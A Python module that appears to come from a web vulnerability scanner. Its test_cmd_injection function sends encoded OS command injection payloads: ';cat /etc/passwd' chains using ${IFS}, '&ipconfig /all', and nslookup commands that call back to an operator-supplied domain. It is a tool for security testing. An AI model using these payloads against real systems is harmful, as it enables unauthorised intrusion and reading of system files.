from src.httpreqs.request import REQUEST
from src.httpreqs.request import prepareRequest
from src.configs.config import proxies
from src.utils.arguments import args
from src.servers.ICMPServer import ICMPThread
from src.utils import colors
from src.utils.stats import stats
import string
import random
import time


def is_value_in_dict(dictionary, target_value):
    for key, value in dictionary.items():
        if key == target_value or value == target_value:
            return True
    return False


def get_key_for_value(dictionary, target_value):
    for key, value in dictionary.items():
        if key == target_value or value == target_value:
            return key
    return ""


def generate_random_alphanumeric():
    alphanumeric_chars = string.ascii_letters + string.digits
    return "".join(random.choices(alphanumeric_chars, k=5))


def test_cmd_injection(url, post):
    if args.verbose:
        print(colors.blue("[i]") + " Testing results-based OS command injection...")

    cmdList = []
    cmdList.append(
        "1%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D%27%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D%5C%22%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D"
    )
    cmdList.append(
        "1%26ipconfig%20%2Fall%26%60ipconfig%20%2Fall%60%26%5C%221%26ipconfig%20%2Fall%26%60ipconfig%20%2Fall%60%26"
    )

    randomVal = []
    # Generate 7 random dns subdomains
    for i in range(7):
        randomVal.append(generate_random_alphanumeric())

    if args.callback:
        cmdList.append(
            "1;nslookup${IFS}"
            + randomVal[0]
            + "."
            + args.callback
            + ";%23${IFS}';nslookup${IFS}"
            + randomVal[1]
            + "."
            + args.callback
            + ';%23${IFS}";nslookup${IFS}'
            + randomVal[2]
            + "."
            + args.callback
            + ";%23${IFS}"
        )
        cmdList.append(
            "1%26nslookup "
            + randomVal[3]
            + "."
            + args.callback
            + "%26`nslookup "
            + randomVal[4]
            + "."
            + args.callback
            + '`%26"1%26nslookup '
            + randomVal[5]
            + "."
            + args.callback
            + "%26`nslookup "
            + randomVal[6]
            + "."
            + args.callback
            + "`%26".format(randomVal[3], randomVal[4], randomVal[5])
        )

    nslookupFlag = False
    callbackFlag = False
    for i in range(len(cmdList)):
        u, reqHeaders, postTest = prepareRequest(args.param, cmdList[i], url, post)

        if "nslookup" in cmdList[i] and args.verbose and not nslookupFlag:
            nslookupFlag = True
            if args.verbose:
                print(
                    colors.blue("[i]")
                    + " Trying to provoke an external callback to '"
                    + args.callback
                    + "'. Check your listener logs..."
                )

        r, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "CMD")

        if not br or args.quick:
            return
